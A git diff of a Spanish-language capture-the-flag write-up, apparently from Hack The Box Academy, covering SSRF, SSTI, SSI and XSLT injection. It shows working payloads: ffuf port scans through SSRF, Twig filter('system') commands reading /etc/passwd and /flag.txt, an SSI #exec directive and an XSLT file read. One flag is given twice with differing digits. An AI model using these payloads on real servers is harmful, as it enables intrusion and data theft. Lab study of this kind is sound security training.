@@ -9,11 +9,15 @@ Una vulnerabilidad de SSRF (Server-Side Request Forgery) es un fallo de segurida
 
 Se capturará la petición con burpsuite para explotar el SSRF clikando en el botón
 
-![[Server-Side Attacks Practise captura.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise captura.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Esta imagen ilustra la confirmación práctica de una vulnerabilidad SSRF: a la izquierda, la terminal con Netcat en escucha comprueba que el servidor objetivo (`10.129.190.252`) realizó una petición HTTP saliente hacia tu máquina de atacante tras procesar los datos; a la derecha, la interfaz de Burp Suite expone la solicitud POST enviada a la aplicación con el parámetro `dateserver` modificado para apuntar a tu dirección IP y puerto (`10.10.14.236:8000`).
 
-![[Server-Side Attacks Practise reconocimiento.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise reconocimiento.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Este comando utiliza la utilidad `seq` para generar una secuencia numérica continua desde el 1 hasta el 10,000 toda esa salida para crear y almacenar un archivo de texto plano llamado `ports.txt`.
 
@@ -27,7 +31,9 @@ Este comando ejecuta la herramienta de fuzzing `ffuf` para llevar a cabo un esca
 ffuf -w ports.txt:FUZZ -u http://10.129.190.252/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2025-09-02" -fr "Failed to connect to"
 ```
 
-![[Server-Side Attacks Practise 8000.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise 8000.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 dateserver=http://127.0.0.1:8000/&date=2024-01-01
@@ -37,11 +43,14 @@ dateserver=http://127.0.0.1:8000/&date=2024-01-01
     
 - **En la respuesta (Response):** El servidor procesa el SSRF, se conecta internamente al puerto `8000` de sí mismo, obtiene el contenido de la aplicación web interna que estaba oculta y te lo devuelve impreso en pantalla, revelando finalmente la bandera: `HTB{911fc5badf7d65aed9380d536c270f8}`
 
-![[Server-Side Attacks Practise flag.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise flag.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{911fc5badf7d65aed95380d536c270f8}**
 
-**Anotación**. Tuve que cambiar archivo vpn porque a la hora de explotar la ip de esta actividad, no me detectaba el puerto 8000. 
+**Anotación**. Tuve que cambiar archivo vpn porque a la hora de explotar la ip de esta actividad, no me detectaba el puerto 8000.
+
 ### Exploiting SSRF
 
 1. **Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag. Feel free to play around with all SSRF exploitation techniques discussed in this section.**
@@ -50,7 +59,9 @@ Antes de realizar la prueba de fuzzing, es importante comprender cómo la aplica
 
 Se solicita un directorio que probablemente no exista. El servidor responde con un error estándar " `404 Not Found` ". Esta respuesta servirá como nuestra referencia y puede ser eliminada durante las pruebas de "fuzzing" para reducir el ruido.
 
-![[Server-Side Attacks Practise sdajkda.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise sdajkda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Con la base establecida, utilizamos `ffuf` para probar posibles nombres de puntos finales a través del parámetro vulnerable `dateserver` . La aplicación añade `.php` , por lo que las entradas de la lista de palabras se utilizan según corresponda. Eliminamos las respuestas que coinciden con el comportamiento conocido de " `404` " y los recuentos de palabras irrelevantes.
 
@@ -58,7 +69,9 @@ Con la base establecida, utilizamos `ffuf` para probar posibles nombres de punto
 ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://10.129.191.3/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr 404 -fw 3,23 -ic
 ```
 
-![[Server-Side Attacks Practise adminaksxla.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise adminaksxla.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 dateserver=http://dateserver.htb/admin.php&date=2024-01-01
@@ -66,9 +79,12 @@ dateserver=http://dateserver.htb/admin.php&date=2024-01-01
 
 Se dirige la solicitud al punto final `admin.php` utilizando el parámetro SSRF:
 
-![[Server-Side Attacks Practise adminphp.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise adminphp.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{61ea58507c2b9da30465b9582d6782a1}**
+
 ### Blind SSRF
 
 1. **Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?**
@@ -79,7 +95,9 @@ Este bloque muestra el parámetro HTTP enviado en la petición POST para probar 
 dateserver=http://10.10.14.236:8001/ssrf&date=2026-01-01
 ```
 
-![[Server-Side Attacks Practise shell sometig wrong.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise shell sometig wrong.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Este comando genera una secuencia numérica del 1 al 10,000 y la guarda en un archivo de texto llamado `ports.txt`. Esto crea un diccionario personalizado con un rango masivo de puertos que se utilizará posteriormente para escanear servicios internos.
 
@@ -93,9 +111,12 @@ Este comando utiliza la herramienta `ffuf` para automatizar un escaneo de puerto
 ffuf -w ports.txt:FUZZ -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2026-01-01" -fr "Something went wrong"
 ```
 
-![[Server-Side Attacks Practise 5000.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise 5000.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **5000**
+
 ## SSTI
 
 El **SSTI (Server-Side Template Injection)** es una vulnerabilidad de seguridad que ocurre cuando una aplicación web procesa de forma insegura entradas proporcionadas por el usuario, incrustándolas directamente dentro de una plantilla en el lado del servidor. Esto permite que un atacante inyecte código o directivas propias del motor de plantillas utilizado (como Jinja2 en Python, Twig en PHP o Thymeleaf en Java), las cuales el servidor interpreta y ejecuta de manera dinámica. Como consecuencia, una explotación exitosa puede permitir desde la lectura de archivos confidenciales hasta la **ejecución remota de código (RCE)**, comprometiendo por completo la infraestructura del servidor.
@@ -110,13 +131,18 @@ Se muestra el panel de prueba donde se introduce la carga útil de diferenciaci�
 {{7*'7'}}
 ```
 
-![[Server-Side Attacks Practise multi.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise multi.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se muestra el resultado devuelto por la aplicación web como "Hi 49!", lo que justifica plenamente por qué el motor utilizado es **Twig**; esto ocurre porque Twig realiza una conversión de tipos implícita interpretando la operación matemáticamente para dar `49`, a diferencia de Jinja, cuyo comportamiento ante esta misma inyección habría sido repetir la cadena generando `7777777`.
 
-![[Server-Side Attacks Practise resultado.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise resultado.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Answer: **Twig**
+
 ### Exploiting SSTI - Jinja2
 
 1. **Exploit the SSTI vulnerability to obtain RCE and read the flag.**
@@ -144,12 +170,16 @@ answer: **HTB{295649e25b4d852185ba34907ec80643}**
 {{ ['cat /flag.txt'] | filter('system') }}
 ```
 
-![[Server-Side Attacks Practise htb gr.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise htb gr.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{5034a6692604de344434ae83f1cdbec6}**
+
 ## SSI Injection
 
 El **SSI (Server-Side Includes)** es un lenguaje de marcado simple utilizado por los servidores web para añadir dinámicamente contenido común (como la fecha actual o la cabecera de una página) a un archivo HTML antes de enviarlo al cliente. Una vulnerabilidad de inyección SSI ocurre cuando una aplicación web permite que datos controlados por el usuario se inserten directamente en páginas procesadas por SSI sin la debida sanitización. Esto permite que un atacante inyecte directivas maliciosas —como el comando `#exec` para ejecutar instrucciones del sistema operativo o `#include` para leer archivos locales—, logrando comprometer la seguridad del servidor web de forma similar a otras fallas del lado del servidor.
+
 ### Exploiting SSi Injection
 
 1. **Exploit the SSI Injection vulnerability to obtain RCE and read the flag.**
@@ -158,12 +188,16 @@ El **SSI (Server-Side Includes)** es un lenguaje de marcado simple utilizado por
 <!--#exec cmd="cat /flag.txt" -->
 ```
 
-![[Server-Side Attacks Practise htbasdasd.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise htbasdasd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{81e5d8e80eec8e961a31229e4a5e737e}**
+
 ## XSLT Injection
 
 El **XSLT (Extensible Stylesheet Language Transformations)** es un lenguaje diseñado para transformar documentos XML en otros formatos, como HTML, texto plano u otros archivos XML. Una vulnerabilidad de **Inyección XSLT** ocurre cuando una aplicación web procesa entradas controladas por el usuario dentro de una hoja de estilos sin la debida validación. Si el motor de XSLT habilitado en el servidor permite la ejecución de funciones externas o scripts (como extensiones de PHP o Java), un atacante puede aprovechar esta capacidad para inyectar código malicioso —similar a lo visto en ataques de XXE—, logrando leer archivos sensibles o alcanzar la ejecución remota de código (RCE).
+
 ### Exploiting XSLT Injection
 
 1. **Exploit the XSLT Injection vulnerability to obtain RCE and read the flag.**
@@ -174,9 +208,12 @@ Este comando es una carga útil (_payload_) de inyección **XXE (XML External En
 <xsl:value-of select="php:function('file_get_contents','/flag.txt')" />
 ```
 
-![[Server-Side Attacks Practise flagtxt.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise flagtxt.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{3a4fe85c1f1e2b61cabe9836a150f892}**
+
 ## Skills Assesment 
 
 ### Server-Side Attacks - Skills Assesment
@@ -191,14 +228,19 @@ http://truckapi.htb/?id%3DFusionExpress01
 {"id": "FusionExpress01", "location": "321 Maple Lane"}
 ```
 
-![[Server-Side Attacks Practise expres01.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise expres01.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ```
 http://truckapi.htb/?id%3DFusionExpress02
 
 {"id": "FusionExpress02", "location": "456 Oak Avenue"}
 ```
 
-![[Server-Side Attacks Practise express02.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise express02.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 http://truckapi.htb/?id%3DFusionExpress03
@@ -206,7 +248,9 @@ http://truckapi.htb/?id%3DFusionExpress03
 {"id": "FusionExpress03", "location": "134 Main Street"}
 ```
 
-![[Server-Side Attacks Practise express03.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise express03.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación, probamos la inyección de plantilla del lado del servidor (SSTI). Comenzamos modificando el parámetro id y observando la respuesta del servidor y el valor proporcionado se refleja directamente en la respuesta:
 
@@ -214,7 +258,9 @@ A continuación, probamos la inyección de plantilla del lado del servidor (SSTI
 api=http://truckapi.htb/?id=HACKED
 ```
 
-![[Server-Side Attacks Practise hacked.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise hacked.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Este comportamiento nos permite distinguir entre motores comunes:  
   
@@ -226,7 +272,9 @@ Dado que el resultado es 49, podemos concluir con seguridad que la aplicación d
 api=http://truckapi.htb/?id={{7*'7'}}
 ```
 
-![[Server-Side Attacks Practise 49.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise 49.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para confirmar la vulnerabilidad, inyectamos una carga útil que expone información contextual sobre la plantilla actual y el servidor responde con metadatos de plantilla interna
 
@@ -236,7 +284,9 @@ Esto confirma la presencia de una vulnerabilidad SSTI explotable.
 api=http://truckapi.htb/?id%3D{{_self}}
 ```
 
-![[Server-Side Attacks Practise iddddd.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise iddddd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación, intentamos lograr la ejecución remota de código aprovechando la función system() de PHP a través de la funcionalidad filter() de Twig y el servidor devuelve un error:
 
@@ -244,7 +294,9 @@ A continuación, intentamos lograr la ejecución remota de código aprovechando 
 api=http://truckapi.htb/?id%3D{{+['cat+/etc/passwd']+|+filter('system')+}}
 ```
 
-![[Server-Side Attacks Practise etcpasssinrulasd.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise etcpasssinrulasd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Es probable que este error se deba a un manejo inadecuado de los caracteres especiales, por tanto en cada `+` que haya se sustituirá por **%2b**, por tanto el comando quedaría así:
 
@@ -252,7 +304,9 @@ Es probable que este error se deba a un manejo inadecuado de los caracteres espe
 api=http://truckapi.htb/?id%3D{{%2b['cat%2b/etc/passwd']%2b|%2bfilter('system')%2b}}
 ```
 
-![[Server-Side Attacks Practise ejdajsdad.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise ejdajsdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación, el siguiente comando se obtendrá la flag.txt del ejercicio
 
@@ -260,4 +314,6 @@ A continuación, el siguiente comando se obtendrá la flag.txt del ejercicio
 http://truckapi.htb/?id%3D{{%2b['cat%2b/flag.txt']%2b|%2bfilter('system')%2b}}
 ```
 
-![[Server-Side Attacks Practise htbflag-1.png]]
+<p align="center"> 
+<img src="images/Server-Side Attacks Practise htbflag-1.png" width="600" alt="Resultado de Nmap">
+</p>
